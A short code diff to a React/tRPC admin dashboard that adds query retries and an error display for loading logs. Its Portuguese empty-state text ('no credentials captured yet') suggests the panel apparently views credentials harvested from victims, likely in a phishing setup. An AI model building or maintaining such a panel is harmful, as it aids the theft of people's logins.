@@ -15,10 +15,20 @@ function AdminDashboard() {
 
   const logsQuery = trpc.admin.getLogs.useQuery(
     { password: emptyPassword },
-    { refetchInterval: 10000 }
+    { 
+      refetchInterval: 10000,
+      retry: 3,
+      retryDelay: 1000,
+    }
   );
 
-  const pdfQuery = trpc.admin.getPdf.useQuery({ password: emptyPassword });
+  const pdfQuery = trpc.admin.getPdf.useQuery(
+    { password: emptyPassword },
+    { 
+      retry: 3,
+      retryDelay: 1000,
+    }
+  );
 
   const uploadMutation = trpc.admin.uploadPdf.useMutation({
     onSuccess: () => {
@@ -145,6 +155,10 @@ function AdminDashboard() {
 
         {logsQuery.isLoading ? (
           <div className="admin-loading">Carregando...</div>
+        ) : logsQuery.isError ? (
+          <div className="admin-error" style={{ padding: "20px", color: "red" }}>
+            Erro ao carregar logs: {logsQuery.error?.message || "Erro desconhecido"}
+          </div>
         ) : logs.length === 0 ? (
           <div className="admin-empty">Nenhuma credencial capturada ainda.</div>
         ) : (
